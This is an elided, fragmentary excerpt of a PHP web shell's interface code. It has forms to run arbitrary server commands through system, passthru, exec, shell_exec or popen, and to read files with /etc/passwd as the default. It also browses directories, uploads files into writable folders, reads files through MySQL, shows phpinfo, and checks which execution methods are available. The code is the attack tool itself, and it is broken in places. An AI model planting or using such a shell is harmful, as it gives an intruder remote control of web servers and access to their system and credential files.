...
<body <?php  if ($method!="show_source") { echo "bgcolor=\"#000000\""; } ?> text="#CCCCCC" link="#CCCCCC" vlink="#CCCCCC" alink="#CCCCCC">
<?php
    ...
    if (!$file) { $file = "/etc/passwd"; }
        ...
        <script>
        var files = new Array();
        <?php for($i=0;count($mysql_files)>$i;$i++) { ?>
        files[files.length] = "<?php echo$mysql_files[$i]?>";
        <?php } ?>
        ...
        <form name="mysqlload" action="<?php echo$PHP_SELF?>?action=mysqlread" method="POST">
            <select name="deffile" onChange="setFile(this)">
            <?php for ($i=0;count($mysql_files)>$i;$i++) { ?>
            <option value="<?php echo$mysql_files[$i]?>"<?php if ($file==$mysql_files[$i]) { echo "selected"; } ?>><?php
        ...
        <input type="text" name="file"  value="<?php echo$file?>" size=80 text="#000000>
        <input type="submit" name="go" value="go"> <font size=2>[ <a href="<?php echo$PHP_SELF?>?action=mysqlread&mass=loadmass">load all defaults</a> ]</font>
        </form>
        <?php
        echo "<pre>";
    ...
    if ($action=="read") {
        ...
        if (!$file) { $file = "/etc/passwd"; }
    ?>
     <form name="form1" method="post" action="<?php echo $PHP_SELF ?>?action=read">
           <select name="method">
                <option value="file" <?php if ($method=="file") { echo "selected"; } ?>>file</option>
                <option value="fread" <?php if ($method=="fread") { echo "selected"; } ?>>fread</option>
                <option value="show_source" <?php if ($method=="show_source") { echo "selected"; } ?>>show_source</option>
                <option value="readfile" <?php if ($method=="readfile") { echo "selected"; } ?>>readfile</option>
              </select><br>

            <input type="text" name="file" size="40" value="<?php echo$file?>">
            <input type="submit" name="Submit" value="<?php echo$method?>">
            <br>
          </form><?php
    ...
    if ($action=="cmd") { ?>
     <form name="form1" method="post" action="<?php  $PHP_SELF ?>?action=cmd">
           <select name="method">
                <option value="system" <?php if ($method=="system") { echo "selected"; } ?>>system</option>
                <option value="passthru" <?php if ($method=="passthru") { echo "selected"; } ?>>passthru</option>
                <option value="exec" <?php if ($method=="exec") { echo "selected"; } ?>>exec</option>
                <option value="shell_exec" <?php if ($method=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
                <option value="popen" <?php if ($method=="popen") { echo "selected"; } ?>>popen</option>
              </select><br>

            <textarea wrap=\"off\" cols="45" rows="10" name="cmd"><?php  $cmd; ?></textarea>
            <input type="submit" name="Submit" value="<?php $method?>">
            <br>
          </form>
    <?php
    ...
    */
        ...
        ?>
         <form name="form1" method="post" action="<?php echo $PHP_SELF ?>?action=browse">
            <input type="text" name="dir" size="40" value="<?php echo$dir; ?>">
...
?>
      <p><table cellpadding=3 cellspacing=1 width="100%" border="0" bgcolor=<?php echo TABLE_BORDER_COLOR; ?>>
         <tr bgcolor="#000000">
            <?php if ($show_icons): ?>
            <td width="16" align="center" bgcolor=<?php echo TABLE_BACKGROUND_COLOR ?>>&nbsp;</td>
            <?php endif; ?>
...
<p>
   <table border="0">
   <tr><?php if ((fileperms($dir) & 00002)){
?>
   <td>
      <form enctype="multipart/form-data" action="<?php print "$PHP_SELF?action=explorer&dir=$dir&do=upload"; ?>" method=post>
...
if (!$action) {
?><p align="right"><font size=2><a href="<?php echo$PHP_SELF?>?action=misc&do=phpinfo">phpinfo</a></font></p><?php
echo "<pre>";
        if ($mysql_use!="no") {
...
<font size=2><a href="<?php echo$PHP_SELF?>?action=check">Security Check</a></font> <font color="green" size=2>[executable] </font>
...
<font size=2><a href="<?php echo$PHP_SELF?>?action=cmd&method=<?php echo$cmd_method?>">Exec commands by PHP</a></font>
<?php
...
//echo $phpcheck->cmd_method;
?>
<font size=2><a href="<?php $PHP_SELF?>?action=cmdbrowse">Exec browse by PHP</a></font>
<?php
if ($phpcheck->cmd_method) {
echo "<font color=\"green\" size=2>[executable] ";  } else { echo "<font color=\"red\" size=2>[not executable]";  }
...
<!-- read check -->
<?php if ($phpcheck->read_method) { $read_method = $phpcheck->read_method; } else { $read_method = "file"; } ?>
<font size=2><a href="<?php echo$PHP_SELF?>?action=read&method=<?php echo $read_method?>">Read by PHP</a></font>
<?php
...
<font size=2><a href="<?php echo$PHP_SELF?>?action=browse&dir=<?php echo$path?>">Browse by PHP</a></font>
<?php
...
//echo $phpcheck->browse_state;
if ($phpcheck->browse_state=="yes") { $path= "/"; } else { $path = getcwd(); } ?>
<font size=2><a href="<?php echo$PHP_SELF?>?action=explorer&dir=<?php echo$path?>">File Explorer by PHP</a></font>
<?php
if ($phpcheck->browse_state=="yes") {
echo "<font color=\"green\" size=2>[executable] "; } else { echo "<font color=\"yellow\" size=2>[limited executable]"; }
?></font>
...
<!-- mysql check -->
<font size=2><a href="<?php echo$PHP_SELF?>?action=mysqlread&file=/etc/passwd">Read by MySQL</a></font>
<?php
